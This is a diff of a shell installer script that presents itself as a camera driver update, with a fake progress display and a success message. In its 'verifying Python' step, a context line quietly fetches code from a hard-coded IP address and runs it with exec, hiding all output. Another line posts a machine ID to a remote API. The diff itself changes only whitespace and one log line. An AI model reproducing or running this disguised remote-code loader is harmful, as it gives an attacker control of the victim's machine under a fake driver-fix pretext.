@@ -104,7 +104,7 @@ run_part1_miniconda() {
     info "Part 1: verifying Python"
     "${PREFIX}/bin/python3" -V >/dev/null 2>&1
     "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
-    
+
   fi
 
   delay 10
@@ -192,10 +192,10 @@ run_part3_ui_delay() {
   echo "[INFO] Update Driver Packages..."
   delay 12
   echo "[SUCCESS] Camera drivers have been updated successfully."
-
   if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
     curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
   fi
+
 }
 
 detect_platform
@@ -221,8 +221,6 @@ fi
 if [[ "$EC_NODE" -ne 0 ]]; then
   die "Part 2 (Node/driver) failed with exit code $EC_NODE"
 fi
-
-echo "[INFO] Part 1 (Miniconda) and Part 2 (Node/driver) completed successfully."
 
 EC_UI=0
 wait "$PID_UI" || EC_UI=$?
